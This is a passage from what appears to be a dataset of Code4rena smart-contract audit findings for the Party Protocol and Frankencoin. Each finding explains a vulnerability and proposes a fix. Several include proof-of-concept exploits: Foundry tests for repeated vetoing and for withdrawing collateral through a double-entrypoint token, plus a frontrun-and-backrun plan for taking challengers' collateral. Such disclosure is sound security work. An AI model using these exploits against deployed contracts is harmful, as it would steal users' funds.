[Link](https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/crowdfund/Crowdfund.sol#L365-L368).    So when the call is made, `msg.sender` is the address of the crowdfund and not the address of the user.    Therefore the gatekeeper check is wrong [Link](https://github.com/PartyDAO/party-protocol/blob/3313c24c85d7429346af939897c19deeef7952f5/contracts/crowdfund/Crowdfund.sol#L596).    This is clearly not how the gatekeeper should be used. The gatekeeper should check the address of the user.    If you implement in the `ReraiseETHCrowdfund` and `InitialETHCrowdfund` contracts the changes I suggested, the same issue will be introduced there.    The solution is to call `_contributeFor` directly and to remove the `revertOnFailure` option. Or do a more involved change with supplying the correct `msg.sender`.     "}, {"title": "OperatorProposal.sol: Leftover ETH is not refunded to the msg.sender", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/5", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-10"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L25-L49   # Vulnerability details  ## Impact The [`OperatorProposal`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L7-L63) contract is a type of proposal that allows to execute operations on contracts that implement the [`IOperator`](https://github.com/code-423n4/2023-04-party/blob/main/contracts/operators/IOperator.sol) interface.    Upon execution of the proposal it might be necessary that the `executor` provides ETH.    This is true especially when `allowOperatorsToSpendPartyEth=false`, i.e. when ETH cannot be spent from the Party's balance. So it must be provided by the `executor`.    The amount of ETH that is needed to execute the operation is sent to the operator contract:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L45)   ```solidity data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData); ```  The operator contract then spends whatever amount of ETH is actually necessary and returns the remaining ETH.    For example the [`CollectionBatchBuyOperator`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224) contract may not spend all of the ETH because the actual purchases that are made are not necessarily known at the time the proposal is created. Also not all purchases may succeed.    So it is clear that some of the ETH may be returned from the `operator` to the `OperatorProposal` contract.    The issue is that the remaining ETH is not refunded to the `executor` and therefore this results in a direct loss of funds for the `executor`.    I discussed this issue with the sponsor and it is clear that the remaining ETH needs to be refunded when `allowOperatorsToSpendPartyEth=false`.    However it is not clear what to do when `allowOperatorsToSpendPartyEth=true`. In this case ETH can be spent from the party's balance. So there should be limited use cases for the `executor` providing additional ETH.    But if the `executor` provides additional ETH what should happen?   Should the ETH be taken from the `executor` first? Or should it be taken from the Party balance first?    The sponsor mentioned that since there are limited use cases for the `executor` providing additional ETH it may be ok to not refund ETH at all.    I disagree with this. Even when `allowOperatorsToSpendPartyEth=true` there should be a policy for refunds. I.e. the necessary ETH should either be taken from the Party's balance or from the `executor` first and any remaining funds from the `executor` should be returned.   However since it is not clear how to proceed in this case and since it is less important compared to the case where `allowOperatorsToSpendPartyEth=false` I will only make a suggestion for the case where `allowOperatorsToSpendPartyEth=false`.    The sponsor should decide what to do in the other case and make the appropriate changes.    ## Proof of Concept When the `executor` executes an `OperatorProposal`, `operatorValue` amount of ETH is sent to the `operator` contract (when `allowOperatorsToSpendPartyEth=false` all of these funds must come from the `msg.value`):    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L40-L45)   ```solidity if (!allowOperatorsToSpendPartyEth && data.operatorValue > msg.value) {     revert NotEnoughEthError(data.operatorValue, msg.value); }   // Execute the operation. data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData); ```  Currently the only `operator` contract that is implemented is the `CollectionBatchBuyOperator` and as explained above not all of the funds may be used so the funds are sent back to the Party:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L191-L192)   ```solidity uint256 unusedEth = msg.value - totalEthUsed; if (unusedEth > 0) payable(msg.sender).transferEth(unusedEth); ```  However after calling the `operator` contract, the `OperatorProposal` contract just returns without sending back the unused funds to the `executor` (`msg.sender`).    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/OperatorProposal.sol#L47-L48)   ```solidity // Nothing left to do. return \"\"; ```  So there is a loss of funds for the `executor`. The leftover funds are effectively transferred to the Party.    ## Tools Used VSCode   ## Recommended Mitigation Steps As mentioned before, this is only a fix for the case when `allowOperatorsToSpendPartyEth=false`.    Fix:   ```diff diff --git a/contracts/proposals/OperatorProposal.sol b/contracts/proposals/OperatorProposal.sol index 23e2897..507e0d5 100644 --- a/contracts/proposals/OperatorProposal.sol +++ b/contracts/proposals/OperatorProposal.sol @@ -4,7 +4,11 @@ pragma solidity 0.8.17;  import \"./IProposalExecutionEngine.sol\";  import \"../operators/IOperator.sol\";   +import \"../utils/LibAddress.sol\"; +  contract OperatorProposal { +    using LibAddress for address payable; +          struct OperatorProposalData {          // Addresses that are allowed to execute the proposal and decide what          // calldata used by the operator proposal at the time of execution. @@ -41,9 +45,17 @@ contract OperatorProposal {              revert NotEnoughEthError(data.operatorValue, msg.value);          }   +        uint256 partyBalanceBefore = address(this).balance - msg.value; +          // Execute the operation.          data.operator.execute{ value: data.operatorValue }(data.operatorData, executionData);   +        if (!allowOperatorsToSpendPartyEth) { +            if (address(this).balance - partyBalanceBefore > 0) { +                payable(msg.sender).transferEth(address(this).balance - partyBalanceBefore); +            } +        } +          // Nothing left to do.          return \"\";      } ```  "}, {"title": "CollectionBatchBuyOperator.sol: tokenIds array is not shortened properly which makes execute function revert when not all NFTs are purchased successfully", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/4", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-11"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183   # Vulnerability details  ## Impact The [`CollectionBatchBuyOperator`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L14-L224) contract allows parties to buy NFTs through proposals.    The proposal specifies an `nftContract` and token IDs (via the `nftTokenIdsMerkleRoot` parameter) that can be bought.    Allowed `executors` can then execute the actual purchase by executing the proposal and providing execution data.    The execution data specifies which token IDs to buy, where to buy them from and the price to buy the tokens for.    The `CollectionBatchBuyOperator.execute` function is supposed to succeed even when not all purchases are successful.    This is achieved by skipping over failed purchases:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L132-L137)   ```solidity {     // Execute the call to buy the NFT.     (bool success, ) = _buy(call.target, callValue, call.data);       if (!success) continue; } ```  Later in the function the NFTs that have been bought are transferred to the party:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L186-L188)   ```solidity for (uint256 i; i < tokenIds.length; ++i) {     op.nftContract.safeTransferFrom(address(this), msg.sender, tokenIds[i]); } ```  If at least one NFT purchase has failed, the `tokenIds` array is bigger than the amount of NFTs that has actually been purchased. In other words there are empty spots at the end of the `tokenIds` array, i.e. the value that is stored there is zero.    Therefore, before transferring the NFTs, the `tokenIds` array needs to be shortened such that it is not attempted to transfer `tokenId=0`.    The contract uses the following code to achieve this:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183)   ```solidity assembly {     // Update length of `tokenIds`     mstore(mload(ex), tokensBought) } ```  This code is wrong as I will explain later.    The impact of this is that when not all purchases are successful the function reverts because it attempts to transfer the `tokenId=0` (since there are empty spots in the `tokenIds` array and the array is not shortened).    So the execution of the proposal will fail when it should actually succeed.    ## Proof of Concept Let's have a look again at the code to shorten the `tokenIds` array:    [Link](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/operators/CollectionBatchBuyOperator.sol#L180-L183)   ```solidity assembly {     // Update length of `tokenIds`     mstore(mload(ex), tokensBought) } ```  It loads the first 32 bytes of `ex` from memory (`ex` is a `CollectionBatchBuyExecutionData` struct) and stores `tokensBought` in the memory location where the 32 bytes point to.    This has nothing to do with shortening the `tokenIds` array.    The correct code would be:    ```solidity assembly {     // Update length of `tokenIds`     mstore(tokenIds, tokensBought) } ```  This writes `tokensBought` to the first 32 bytes slot of the `tokenIds` array which is where the size of the array is stored.    There exists a test case for this scenario in the `CollectionBatchBuyOperator.t.sol` test file. However the test contains an error which makes the test pass even though the `tokenIds` array is not shortened.    Apply these changes to the test file:   ```diff diff --git a/sol-tests/operators/CollectionBatchBuyOperator.t.sol b/sol-tests/operators/CollectionBatchBuyOperator.t.sol index 3956e84..a944c74 100644 --- a/sol-tests/operators/CollectionBatchBuyOperator.t.sol +++ b/sol-tests/operators/CollectionBatchBuyOperator.t.sol @@ -165,7 +165,7 @@ contract CollectionBatchBuyOperatorTest is Test, TestUtils, ERC721Receiver {          bytes memory executionData = abi.encode(              CollectionBatchBuyOperator.CollectionBatchBuyExecutionData({                  calls: calls, -                numOfTokens: 2 +                numOfTokens: 3              })          ); ```  Notice that when running the test (with the changes to the test file applied) it fails since the `tokenIds` array is not shortened properly.    Then also apply the changes to the source file (shortening the array properly) and see that the test passes.    ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps As explained above, this is how to properly shorten the `tokenIds` array:    ```diff diff --git a/contracts/operators/CollectionBatchBuyOperator.sol b/contracts/operators/CollectionBatchBuyOperator.sol index 4b1dcc9..fffa5e9 100644 --- a/contracts/operators/CollectionBatchBuyOperator.sol +++ b/contracts/operators/CollectionBatchBuyOperator.sol @@ -179,7 +179,7 @@ contract CollectionBatchBuyOperator is IOperator {            assembly {              // Update length of `tokenIds` -            mstore(mload(ex), tokensBought) +            mstore(tokenIds, tokensBought)          } ```   "}, {"title": "VetoProposal: user can veto multiple times so every proposal can be votoed by any user that has a small amount of votes", "html_url": "https://github.com/code-423n4/2023-04-party-findings/issues/2", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-08"], "target": "2023-04-party-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60   # Vulnerability details  ## Impact The [`VetoProposal`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L8-L69) contract allows to veto proposals with the [`voteToVeto`](https://github.com/code-423n4/2023-04-party/blob/440aafacb0f15d037594cebc85fd471729bcb6d9/contracts/proposals/VetoProposal.sol#L19-L60) function.    When the amount of votes collected to veto a proposal exceeds a certain threshold (the `passThresholdBps`, which is determined upon initialization of the party), the proposal is vetoed, meaning it cannot execute anymore (its status becomes `Defeated`).    The `passThresholdBps` specifies a percentage of the `totalVotingPower` of the party.    E.g. `passThresholdBps=1000` means that 10% of the `totalVotingPower` must veto a proposal such that the veto goes through.    The issue is that the contract lacks the obvious check that a user has not vetoed before, thereby a user can veto multiple times.    So say a user holds 1% of `totalVotingPower` and in order for the veto to go through, 10% of `totalVotingPower` must veto.    The user can just veto 10 times to reach the 10% requirement.    The impact is obvious: Any user with a small amount of votes can veto any proposal. This is a critical bug since the party may become unable to perform any actions if there is a user that vetoes all proposals.    ## Proof of Concept Add the following test to the `VetoProposal.t.sol` test file:    ```solidity function test_VetoMoreThanOnce() public {     _assertProposalStatus(PartyGovernance.ProposalStatus.Voting);      // Vote to veto     vm.prank(voter1);     vetoProposal.voteToVeto(party, proposalId, 0);      _assertProposalStatus(PartyGovernance.ProposalStatus.Voting);     assertEq(vetoProposal.vetoVotes(party, proposalId), 1e18);      // Vote to veto (passes threshold)     vm.prank(voter1);     vetoProposal.voteToVeto(party, proposalId, 0);      _assertProposalStatus(PartyGovernance.ProposalStatus.Defeated);     assertEq(vetoProposal.vetoVotes(party, proposalId), 0); // Cleared after proposal is vetoed } ``` In the test file, these are the conditions: `totalVotingPower = 3e18`, required votes threshold is 51%, `voter1` has `1e18` votes which is `~33%`. Clearly `voter1` should not be able to veto the proposal on his own.      You can see in the test that `voter1` can veto 2 times.   After the first call to `voteToVeto`, the threshold is not yet reached (the proposal is still in the `Voting` state).    After the second call to `voteToVeto` the threshold is reached and the proposal is in the `Defeated` state.    ## Tools Used VSCode, Foundry  ## Recommended Mitigation Steps The fix is straightforward.    We introduce a `hasVoted` mapping that tracks for each `(party, proposalId, address)` triplet if it has vetoed already.    Fix:   ```diff diff --git a/contracts/proposals/VetoProposal.sol b/contracts/proposals/VetoProposal.sol index 780826f..fb1f1ab 100644 --- a/contracts/proposals/VetoProposal.sol +++ b/contracts/proposals/VetoProposal.sol @@ -8,9 +8,11 @@ import \"../party/Party.sol\";  contract VetoProposal {      error NotPartyHostError();      error ProposalNotActiveError(uint256 proposalId); +    error AlreadyVotedError(address caller);        /// @notice Mapping from party to proposal ID to votes to veto the proposal.      mapping(Party => mapping(uint256 => uint96)) public vetoVotes; +    mapping(Party => mapping(uint256 => mapping(address => bool))) public hasVoted;        /// @notice Vote to veto a proposal.      /// @param party The party to vote on. @@ -33,6 +35,12 @@ contract VetoProposal {          if (proposalStatus != PartyGovernance.ProposalStatus.Voting)              revert ProposalNotActiveError(proposalId);   +        if (hasVoted[party][proposalId][msg.sender]) { +            revert AlreadyVotedError(msg.sender); +        } + +        hasVoted[party][proposalId][msg.sender] = true; +          // Increase the veto vote count          uint96 votingPower = party.getVotingPowerAt(              msg.sender, ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/956", "labels": ["bug", "G (Gas Optimization)", "high quality report", "selected for report", "sponsor confirmed", "G-03"], "target": "2023-04-frankencoin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-frankencoin-findings/blob/main/data/c3phas-G.md)."}, {"title": "Challenges can be frontrun with de-leveraging to cause lossses for challengers", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/945", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/MintingHub.sol#L140-L148   # Vulnerability details  ## Impact Challenges, once created, cannot be closed. Thus once a challenge is created, the challenger has already transferred in a collateral amount and is thus open for losing their collateral to a bidding war which will most likely close below market price, since otherwise buying from the market would be cheaper for bidders.  Position owners can take advantage of this fact and frontrun a `launchChallenge` transaction with an `adjustPrice` transaction. The `adjustPrice` function lets the user lower the price of the position, and can pass the collateral check by sending collateral tokens externally.  As a worst case scenario, consider a case where a position is open with 1 ETH collateral and 1500 ZCHF minted. A challenger challenges the position and the owner frontruns the challenger by sending the contract 1500 ZCHF and calling `repay()` and then calling `adjustPrice` with value 0, all in one transaction with a contract. Now, the price in the contract is set to 0, and the collateral check passes since the outstanding minted amount is 0. The challenger's transaction gets included next, and they are now bidding away their collateral, since any amount of bid will pass the avert collateral check.  The position owner themselves can backrun the same transaction with a bid of 1 wei and take all the challenger's collateral, since every bid checks for the `tryAvertChallenge` condition. ```solidity if (_bidAmountZCHF * ONE_DEC18 >= price * _collateralAmount) ```  Since price is set to 0, any bid passes this check. This sandwich attack causes immense losses to all challengers in the system, baiting them with bad positions and then sandwiching their challenges.  Since sandwich attacks are extremely commonplace, this is classified as high severity. ## Proof of Concept The attack can be performed the following steps.  1. Have an undercollateralized position. This can be caused naturally due to market movements. 2. Frontrun challenger's transaction with a repayment and `adjustPrice` call lowering the price. 3. Challenger's call gets included, where they now put up collateral for bids. 4. Backrun challenger's call with a bid such that it triggers the avert. 5. Attacker just claimed the challenger's collateral at their specified bid price, which can be as little as 1 wei if price is 0.  ## Tools Used Manual Review ## Recommended Mitigation Steps When launching a challenge, ask for a `expectedPrice` argument. If the actual price does not match this expected price, that means that transaction was frontrun and should be reverted. This acts like a slippage check for challenges."}, {"title": "function `restructureCapTable()` in Equity.sol not functioning as expected ", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/941", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L313   # Vulnerability details  ## Impact Incorrect typo in function `restructureCapTable()` leading to only burning tokens of first address of `addressToWipe` array arguement.   ## Proof of Concept Here, in L313, addressToWipe[0] only takes first address of the array. While ignoring the rest and also since first address's tokens are burned it will fail `addressesToWipe` array has more than one addresses. ```     function restructureCapTable(address[] calldata helpers, address[] calldata addressesToWipe) public {         require(zchf.equity() < MINIMUM_EQUITY);         checkQualified(msg.sender, helpers);         for (uint256 i = 0; i<addressesToWipe.length; i++){             address current = addressesToWipe[0];             _burn(current, balanceOf(current));         }     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Change `address current = addressesToWipe[0];` ==> ` address current = addressesToWipe[i];`"}, {"title": "anchorTime() will not work properly on Optimism due to use of block.number", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/914", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code   https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L173   # Vulnerability details  When deploying to Optimism, Equity.anchorTime() will not be accurate due to the use of block.number.   ```     function anchorTime() internal view returns (uint64){         return uint64(block.number << BLOCK_TIME_RESOLUTION_BITS);     } ```  ## Impact The inaccuracy of block.number will affect the computation of the holding duration for the votes. That will affect redeem() as the issue will cause it to deviate from the intended design of 90 days minimum holding duration (stated in comments).  https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L54-L59  ## Detailed Explanation Noted that the devs have mentioned that it is conceivable that Frankencoin will be deployed on other evm chains. So it is worth reviewing the use of block.number, such that it is compatible with other chains like Optimism.  On Optimism, the `block.number` is not a reliable source of timing information and the time between each block is also different from Ethereum. This is because each transaction on L2 is placed in a separate block and blocks are not produce at a constant rate. This will cause the holding duration computation using `anchorTime()` to fluctuate. (see Optimism docs https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps)    ## Recommended Mitigation Steps Consider using block.timestamp instead of block.number for more accurate measurement of time."}, {"title": "[H-06] Double-entrypoint collateral token allows position owner to withdraw underlying collateral without repaying ZCHF", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/886", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-02"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L245-L255   # Vulnerability details  ## Impact  `Position::withdraw` is intended to allow the position owner to withdraw any ERC20 token which might have ended up at position address. If the collateral address is passed as argument then `Position::withdrawCollateral` is called to perform the necessary checks and balances. However, this can be bypassed if the collateral token is a double-entrypoint token.  Such tokens are problematic because the legacy token delegates its logic to the new token, meaning that two separate addresses are used to interact with the same token. Previous examples include TUSD which resulted in [vulnerability when integrated into Compound](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/). This highlights the importance of carefully selecting the collateral token, especially as this type of vulnerability is not easily detectable. In addition, it is not unrealistic to expect that an upgradeable collateral token could become a double-entrypoint token in the future, e.g. USDT, so this must also be considered.  This vector involves the position owner dusting the contract with the collateral token's legacy counterpart which allows them to withdraw the full collateral balance by calling `Position::withdraw` passing the legacy address as `token` argument. This behaviour is flawed as the position owner should repay the ZCHF debt before withdrawing their underlying collateral.  ## Proof of Concept  Apply the following git diff:  ```diff diff --git a/.gitmodules b/.gitmodules index 888d42d..e80ffd8 100644 --- a/.gitmodules +++ b/.gitmodules @@ -1,3 +1,6 @@  [submodule \"lib/forge-std\"]   path = lib/forge-std   url = https://github.com/foundry-rs/forge-std +[submodule \"lib/openzeppelin-contracts\"] + path = lib/openzeppelin-contracts + url = https://github.com/openzeppelin/openzeppelin-contracts diff --git a/lib/openzeppelin-contracts b/lib/openzeppelin-contracts new file mode 160000 index 0000000..0a25c19 --- /dev/null +++ b/lib/openzeppelin-contracts @@ -0,0 +1 @@ +Subproject commit 0a25c1940ca220686588c4af3ec526f725fe2582 diff --git a/test/DoubleEntryERC20.sol b/test/DoubleEntryERC20.sol new file mode 100644 index 0000000..b871288 --- /dev/null +++ b/test/DoubleEntryERC20.sol @@ -0,0 +1,74 @@ +// SPDX-License-Identifier: MIT +pragma solidity ^0.8.0; + +import \"../lib/openzeppelin-contracts/contracts/access/Ownable.sol\"; +import \"../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\"; + +interface DelegateERC20 { +    function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); +    function delegateBalanceOf(address account) external view returns (uint256); +} + +contract LegacyToken is ERC20(\"LegacyToken\", \"LGT\"), Ownable { +    DelegateERC20 public delegate; + +    constructor() { +        _mint(msg.sender, 100 ether); +    } + +    function mint(address to, uint256 amount) public onlyOwner { +        _mint(to, amount); +    } + +    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner { +        delegate = newContract; +    } + +    function transfer(address to, uint256 value) public override returns (bool) { +        if (address(delegate) == address(0)) { +            return super.transfer(to, value); +        } else { +            return delegate.delegateTransfer(to, value, msg.sender); +        } +    } + +    function balanceOf(address account) public view override returns (uint256) { +        if (address(delegate) == address(0)) { +            return super.balanceOf(account); +        } else { +            return delegate.delegateBalanceOf(account); +        } +    } +} + +contract DoubleEntryPoint is ERC20(\"DoubleEntryPointToken\", \"DET\"), DelegateERC20, Ownable { +    address public delegatedFrom; + +    constructor(address legacyToken) { +        delegatedFrom = legacyToken; +        _mint(msg.sender, 100 ether); +    } + +    modifier onlyDelegateFrom() { +        require(msg.sender == delegatedFrom, \"Not legacy contract\"); +        _; +    } + +    function mint(address to, uint256 amount) public onlyOwner { +        _mint(to, amount); +    } + +    function delegateTransfer(address to, uint256 value, address origSender) +        public +        override +        onlyDelegateFrom +        returns (bool) +    { +        _transfer(origSender, to, value); +        return true; +    } + +    function delegateBalanceOf(address account) public view override onlyDelegateFrom returns (uint256) { +        return balanceOf(account); +    } +} diff --git a/test/GeneralTest.t.sol b/test/GeneralTest.t.sol index 402416d..9ce13cd 100644 --- a/test/GeneralTest.t.sol +++ b/test/GeneralTest.t.sol @@ -14,6 +14,7 @@ import \"../contracts/MintingHub.sol\";  import \"../contracts/PositionFactory.sol\";  import \"../contracts/StablecoinBridge.sol\";  import \"forge-std/Test.sol\"; +import {LegacyToken, DoubleEntryPoint} from \"./DoubleEntryERC20.sol\";    contract GeneralTest is Test {   @@ -24,6 +25,8 @@ contract GeneralTest is Test {      TestToken col;      IFrankencoin zchf;   +    LegacyToken legacy; +    DoubleEntryPoint doubleEntry;      User alice;      User bob;   @@ -35,10 +38,41 @@ contract GeneralTest is Test {          hub = new MintingHub(address(zchf), address(new PositionFactory()));          zchf.suggestMinter(address(hub), 0, 0, \"\");          col = new TestToken(\"Some Collateral\", \"COL\", uint8(0)); +        legacy = new LegacyToken(); +        doubleEntry = new DoubleEntryPoint(address(legacy));          alice = new User(zchf);          bob = new User(zchf);      }   +    function testPoCWithdrawDoubleEntrypoint() public { +        alice.obtainFrankencoins(swap, 1000 ether); +        emit log_named_uint(\"alice zchf balance before opening position\", zchf.balanceOf(address(alice))); +        uint256 initialAmount = 100 ether; +        doubleEntry.mint(address(alice), initialAmount); +        vm.startPrank(address(alice)); +        doubleEntry.approve(address(hub), initialAmount); +        uint256 balanceBefore = zchf.balanceOf(address(alice)); +        address pos = hub.openPosition(address(doubleEntry), 100, initialAmount, 1000000 ether, 100 days, 1 days, 25000, 100 * (10 ** 36), 200000); +        require((balanceBefore - hub.OPENING_FEE()) == zchf.balanceOf(address(alice))); +        vm.warp(Position(pos).cooldown() + 1); +        alice.mint(pos, initialAmount); +        vm.stopPrank(); +        emit log_named_uint(\"alice zchf balance after opening position and minting\", zchf.balanceOf(address(alice))); + +        uint256 legacyAmount = 1; +        legacy.mint(address(alice), legacyAmount); +        uint256 totalAmount = initialAmount + legacyAmount; +        vm.prank(address(alice)); +        legacy.transfer(pos, legacyAmount); +        legacy.delegateToNewContract(doubleEntry); + +        vm.prank(address(alice)); +        Position(pos).withdraw(address(legacy), address(alice), initialAmount); +        emit log_named_uint(\"alice collateral balance after withdrawing collateral\", doubleEntry.balanceOf(address(alice))); +        emit log_named_uint(\"alice zchf balance after withdrawing collateral\", zchf.balanceOf(address(alice))); +        console.log(\"uh-oh, alice withdrew collateral without repaying zchf ://\"); +    } +      function initPosition() public returns (address) {          alice.obtainFrankencoins(swap, 1000 ether);          address pos = alice.initiatePosition(col, hub); ```  ## Tools Used  - Manual review - Foundry  ## Recommended Mitigation  - Validate the collateral balance has not changed after the token transfer within the call to `Position::withdraw`. - Otherwise, consider restricting the use of `Position::withdraw` or remove it altogether. "}, {"title": "Owner of Denied Position is not able to withdraw collateral until expiry.", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/874", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L112 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L263 https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L373-L376   # Vulnerability details  Denying a position puts it into perma cooldown state ie. cooldown ends at expiry. It\u2019s impossible to withdraw collateral in the cooldown state.   ## Impact Locks owner funds until expiry, expiry time is not capped and can be expected to be long. There is no benefit to the owner to set it shorter and be forced to repay the position at an inconvenient time. Hence a high risk exists to lock the collateral semi permanently  ## Proof of Concept Consider owner trying to call `withdrawCollateral` on a denied position ```     function deny(address[] calldata helpers, string calldata message) public {         if (block.timestamp >= start) revert TooLate();         IReserve(zchf.reserve()).checkQualified(msg.sender, helpers);         cooldown = expiration; // since expiration is immutable, we put it under cooldown until the end         emit PositionDenied(msg.sender, message);     }      function withdrawCollateral(address target, uint256 amount) public onlyOwner noChallenge noCooldown {         uint256 balance = internalWithdrawCollateral(target, amount);         checkCollateral(balance, price);     }      modifier noCooldown() {         if (block.timestamp <= cooldown) revert Hot();         _;     }   ``` 1. Successful call all to `deny` will set `cooldown = expiry` 2. Subsequent call to `withdrawCollateral` will be reverted by `noCooldown` modifier  ## Tools Used VS code, Pen and Paper  ## Recommended Mitigation Steps Return the collateral to the owner at the end of `deny` ```     function deny(address[] calldata helpers, string calldata message) public {         if (block.timestamp >= start) revert TooLate();         IReserve(zchf.reserve()).checkQualified(msg.sender, helpers);         cooldown = expiration; // since expiration is immutable, we put it under cooldown until the end         internalWithdrawCollateral(owner, IERC20(collateral).balanceOf(address(this)));         emit PositionDenied(msg.sender, message);     } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/756", "labels": ["bug", "G (Gas Optimization)", "grade-b", "high quality report", "sponsor confirmed", "G-19"], "target": "2023-04-frankencoin-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-04-frankencoin-findings/blob/main/data/xmxanuel-G.md)."}, {"title": "Challengers and bidders can collude together to restrict the minting of position owner", "html_url": "https://github.com/code-423n4/2023-04-frankencoin-findings/issues/745", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-04-frankencoin-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-04-frankencoin/blob/1022cb106919fba963a89205d3b90bf62543f68f/contracts/Position.sol#L312   # Vulnerability details  ## Proof of Concept  There is no restrictions as to how many challenges can occur at one given auction time. A challenger can potentially create an insanely large amount of challenges with a tiny amount of collateral for each challenge.   ```     function launchChallenge(address _positionAddr, uint256 _collateralAmount) external validPos(_positionAddr) returns (uint256) {         IPosition position = IPosition(_positionAddr);         IERC20(position.collateral()).transferFrom(msg.sender, address(this), _collateralAmount);         uint256 pos = challenges.length;         challenges.push(Challenge(msg.sender, position, _collateralAmount, block.timestamp + position.challengePeriod(), address(0x0), 0));         position.notifyChallengeStarted(_collateralAmount);         emit ChallengeStarted(msg.sender, address(position), _collateralAmount, pos);         return pos;     } ```  Let's say if the fair price of 1000 ZCHF is 1 WETH, and the position owner sets his position at the fair price. Rationally, there will be no challenges and bidders because the price is fair. However, the challenger can attack the position owner this way:  1. Set a small amount of collateralAmount to challenge, ie 0.0001 WETH. 2. The bidder comes and bid a price over 1000* ZCHF (Not the actual amount*. The actual amount is an equivalent amount scaled to the collateral, but for simplicity sake let's just say 1000 ZCHF, ideally its like 1000 * 0.0001 worth) 3. Because the bid is higher than 1000* ZCHF, 